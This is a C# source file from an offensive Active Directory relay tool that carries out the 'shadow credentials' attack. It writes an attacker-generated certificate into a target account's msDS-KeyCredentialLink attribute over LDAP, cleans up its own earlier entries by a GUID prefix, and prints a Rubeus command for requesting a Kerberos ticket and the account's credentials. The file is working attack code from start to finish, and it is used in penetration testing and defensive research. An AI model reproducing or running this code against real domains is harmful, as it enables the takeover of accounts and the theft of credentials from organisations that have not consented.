using DSInternals.Common.Data;
using Org.BouncyCastle.Asn1.X509;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Prng;
using Org.BouncyCastle.Math;
using Org.BouncyCastle.Pkcs;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.Utilities;
using Org.BouncyCastle.X509;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace KrbRelay.Clients.Attacks.Ldap
{
    internal class ShadowCredential
    {
        static readonly byte[] GuidTrackPrefix = new byte[] { 0xd0, 0x9f, 0x1b, 0x27 }; 

        public static LdapStatus attack(IntPtr ld, string target = "")
        {
            string dn = Generic.GetDistinguishedNameFromAccountName(ld, target);
            string password = Guid.NewGuid().ToString();

            // First query and remove existing entries we might have added

            List<byte[]> entries = Generic.GetAttribute(ld, dn, "msDS-KeyCredentialLink");

            if (entries.Count > 0)
            {
                Console.WriteLine("[*] Existing linked credentials:");
                foreach(var entry in entries)
                {
                    var credential = KeyCredential.ParseDNBinary(Encoding.ASCII.GetString(entry));
                    byte[] guidPrefix = credential.DeviceId?.ToByteArray().Take(GuidTrackPrefix.Length).ToArray();
                    if (guidPrefix.SequenceEqual(GuidTrackPrefix))
                    {
                        var removeResult = Generic.RemoveAttribute(ld, dn, "msDS-KeyCredentialLink", entry);
                        Console.WriteLine(" |- {0} [Delete -> {1}]", credential.DeviceId, removeResult);
                    } else
                    {
                        Console.WriteLine(" |- {0}", credential.DeviceId);
                    }
                }
            }

            X509Certificate2 cert;
            KeyCredential keyCredential;
            //cert = GenerateSelfSignedCert(dn);
            // > net45
            RSA rsa = new RSACryptoServiceProvider(
                2048,
                new CspParameters(
                    24,
                    "Microsoft Enhanced RSA and AES Cryptographic Provider",
                    Guid.NewGuid().ToString()
                )
            );
            CertificateRequest req = new CertificateRequest(
                String.Format("cn={0}", target),
                rsa,
                HashAlgorithmName.SHA256,
                RSASignaturePadding.Pkcs1
            );
            cert = req.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));

            // Apply a prefix so we can track for removal later

            Guid guid = Guid.NewGuid();
            byte[] guidBytes = guid.ToByteArray();
            for(int i = 0; i < GuidTrackPrefix.Length; i++)
            {
                guidBytes[i] = GuidTrackPrefix[i];
            }
            guid = new Guid(guidBytes);

            keyCredential = new KeyCredential(cert, guid, dn, DateTime.Now);

            LdapStatus result;
            if (entries.Count > 0)
            {
                result = Generic.AddAttribute(
                    ld,
                    dn,
                    "msDS-KeyCredentialLink",
                    Encoding.ASCII.GetBytes(keyCredential.ToDNWithBinary())
                );
            } else
            {
                result = Generic.SetAttribute(
                    ld,
                    dn,
                    "msDS-KeyCredentialLink",
                    Encoding.ASCII.GetBytes(keyCredential.ToDNWithBinary())
                );
            }


            if (result != LdapStatus.Success)
                return result;

            byte[] certBytes = cert.Export(X509ContentType.Pfx, password);
            var certOutput = Convert.ToBase64String(certBytes);
            Console.WriteLine("[+] Added credentials, here is your Rubeus command:\n");
            Console.WriteLine(
                "Rubeus.exe asktgt /user:{0} /certificate:{1} /password:\"{2}\" /getcredentials /show\n",
                target,
                certOutput,
                password
            );

            return result;
        }

        //https://stackoverflow.com/a/51687630
        public static X509Certificate2 GenerateSelfSignedCert(
            string subjectName,
            int keyStrength = 2048
        )
        {
            // Generating Random Numbers
            var randomGenerator = new CryptoApiRandomGenerator();
            var random = new SecureRandom(randomGenerator);

            // The Certificate Generator
            var certificateGenerator = new X509V3CertificateGenerator();

            // Serial Number
            var serialNumber = BigIntegers.CreateRandomInRange(
                BigInteger.One,
                BigInteger.ValueOf(Int64.MaxValue),
                random
            );
            certificateGenerator.SetSerialNumber(serialNumber);

            // Signature Algorithm
            const string signatureAlgorithm = "SHA256WithRSA";
            certificateGenerator.SetSignatureAlgorithm(signatureAlgorithm);

            // Issuer and Subject Name
            var subjectDN = new X509Name(subjectName);
            var issuerDN = subjectDN;
            certificateGenerator.SetIssuerDN(issuerDN);
            certificateGenerator.SetSubjectDN(subjectDN);

            // Valid For
            var notBefore = DateTime.UtcNow.Date;
            var notAfter = notBefore.AddYears(20);

            certificateGenerator.SetNotBefore(notBefore);
            certificateGenerator.SetNotAfter(notAfter);

            // Subject Public Key
            AsymmetricCipherKeyPair subjectKeyPair;
            var keyGenerationParameters = new KeyGenerationParameters(random, keyStrength);
            var keyPairGenerator = new RsaKeyPairGenerator();
            keyPairGenerator.Init(keyGenerationParameters);
            subjectKeyPair = keyPairGenerator.GenerateKeyPair();

            certificateGenerator.SetPublicKey(subjectKeyPair.Public);

            // Generating the Certificate
            var issuerKeyPair = subjectKeyPair;

            // selfsign certificate
            var certificate = certificateGenerator.Generate(issuerKeyPair.Private, random);

            // in-memory PFX stream
            var pkcs12Store = new Pkcs12Store();
            var certEntry = new X509CertificateEntry(certificate);
            pkcs12Store.SetCertificateEntry(subjectName, certEntry);
            pkcs12Store.SetKeyEntry(
                subjectName,
                new AsymmetricKeyEntry(subjectKeyPair.Private),
                new[] { certEntry }
            );
            X509Certificate2 keyedCert;
            using (MemoryStream pfxStream = new MemoryStream())
            {
                pkcs12Store.Save(pfxStream, new char[0], new SecureRandom());
                pfxStream.Seek(0, SeekOrigin.Begin);
                keyedCert = new X509Certificate2(
                    pfxStream.ToArray(),
                    string.Empty,
                    X509KeyStorageFlags.Exportable
                );
            }

            return keyedCert;
        }
    }
}
